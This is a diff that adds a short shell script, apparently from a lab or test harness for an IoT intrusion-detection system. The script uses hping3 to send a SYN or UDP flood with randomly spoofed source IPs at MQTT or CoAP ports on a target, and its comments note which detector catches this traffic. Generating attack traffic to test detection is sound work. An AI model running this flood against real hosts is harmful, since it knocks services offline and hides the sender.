@@ -1,0 +1,9 @@
+#!/bin/sh
+# Flood with a FAKE, random source IP on every packet (IP spoofing). The IDS model cannot see this
+# (no sender ever sends 10 packets), the AddressWatcher rule can: one MAC, many source IPs.
+# Usage: spoofed_flood [syn|udp] [seconds] [microseconds between packets]
+KIND=${1:-syn}; SECS=${2:-10}; GAP=${3:-500}
+if [ "$KIND" = "udp" ]; then FLAGS="--udp -p 5683"; else FLAGS="-S -p 1883"; fi
+echo "spoofed $KIND flood -> $TARGET for ${SECS}s (random source IPs, gap ${GAP}us)"
+timeout "$SECS" hping3 $FLAGS --rand-source -i u"$GAP" "$TARGET" >/dev/null 2>&1
+echo "done"
